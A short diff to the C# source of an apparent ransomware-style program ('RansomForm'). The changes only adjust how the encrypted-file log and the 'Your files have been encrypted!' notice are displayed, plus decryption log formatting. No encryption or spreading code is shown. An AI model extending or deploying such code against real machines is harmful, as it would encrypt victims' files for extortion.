@@ -124,18 +124,16 @@ namespace RansomForm
       }
       finally
       {
-        ENCRYPTION_LOG += path + "\n";
         encryptedFileCount++;
+        ENCRYPTION_LOG += encryptedFileCount + ". " + path + Environment.NewLine;//+ "\n" + Environment.NewLine;
       }
     }
-    private void formatFormPostEncryption() // 4
+    private void formatFormPostEncryption()
     {
       this.Opacity = 100;
-      this.WindowState = FormWindowState.Maximized;
       lblCount.Text = "Your files (count: " + encryptedFileCount + ") have been encrypted!";
-      encryptedFileslbl.Text = ENCRYPTION_LOG;
+      textBox1.AppendText(ENCRYPTION_LOG);
     }
-
 
     private void buttonDecrypt_Click(object sender, EventArgs e) // 5
     {
@@ -224,7 +222,7 @@ namespace RansomForm
       }
       finally
       {
-        DECRYPTION_LOG += path + "\n";
+        DECRYPTION_LOG += path + Environment.NewLine;
         decryptedFileCount++;
       }
     }
